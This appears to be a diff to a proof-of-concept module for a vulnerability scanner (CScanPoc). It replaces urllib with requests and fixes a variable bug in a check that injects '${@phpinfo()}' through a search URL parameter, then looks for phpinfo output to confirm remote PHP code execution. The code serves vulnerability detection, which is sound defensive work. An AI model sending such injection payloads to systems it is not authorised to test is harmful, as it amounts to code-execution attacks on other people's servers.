@@ -2,9 +2,6 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request
-import urllib.error
-import urllib.parse
 
 
 class Vuln(ABVuln):
@@ -62,12 +59,12 @@ class Poc(ABPoc):
                 '/app/?app=search&controller=index&id=$page&action=search&wd=a&test=${@phpinfo()}'
             ]
             for payload in payloads:
-                print(payload)
+                self.output.info("payload={0}".format(payload))
                 verify_url = self.target + payload
-                req = urllib.request.Request(verify_url)
-                content = urllib.request.urlopen(req).read()
+                req = requests.get(verify_url)
+                content = req.text
 
-                if req.getcode() == 200 and 'PHP Version' in res and 'Configure Command' in content:
+                if req.status_code == 200 and 'PHP Version' in content and 'Configure Command' in content:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
